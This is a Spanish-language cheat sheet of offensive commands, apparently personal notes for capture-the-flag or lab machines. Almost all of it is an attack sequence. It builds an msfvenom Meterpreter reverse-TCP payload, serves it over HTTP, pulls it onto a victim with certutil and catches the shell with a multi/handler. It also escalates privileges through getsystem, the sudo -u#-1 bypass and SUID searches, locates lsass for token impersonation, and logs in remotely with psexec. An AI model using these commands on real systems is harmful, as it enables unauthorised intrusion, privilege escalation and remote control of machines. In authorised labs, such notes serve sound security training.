getuid = server username
sysinfo =informacion del sistema (en metaslpoit dentro de windows informacion de meterpreter x86/x64)
ps -S explorer.exe = buscar el proceso explorer.exe
migrate PID = seleccionamos el proceso de explorer
getsystem = para elevar privilegios
net localgroup administrators = consultar usuario del grupo administradores
ps -S lsass.exe = localizar pid de proceso de autenticacion del sistema
getprivs = podemos ver los privilegios del usuario en orden de realizar una suplantacion de tokens
dir C:\\ flag /s = buscamos de forma recursiva en todo C: por el archivo flag
whoami priv > ver privilegios windows

wfuzz -u http://IP/direcotorios/FUZZ.extension -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c --hc 404
steghide extract --sf archivo.jpg
file para ver de que tipo es un archivo


find / -perm -u=s -type f 2>/dev/null
exiftool para ver metadatos de una imagen
strings nos trae los datos del archivo
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=port -f exe > payload.exe
python -m SimpleHTTPServer 80
windows: certutil -urlcache -f http://LHOST/payload.exe > descarga  archivo en victima
msfc > use multihandler
	set payload windows/x64/meterpreter/reverse_tcp
		set LHOST
		set LPORT
Al ejecutar el payload en la victima obtenemos un meterpreter ss.
	meterpreter> search (para buscar el unattend.xml)

base64 -d archivo.txt > decode base64 linux

psexec.py USUARIO@IP > nos conectamos a una maquina windows si tiene smb
	tambien esta disponible el modulo en msfconsole

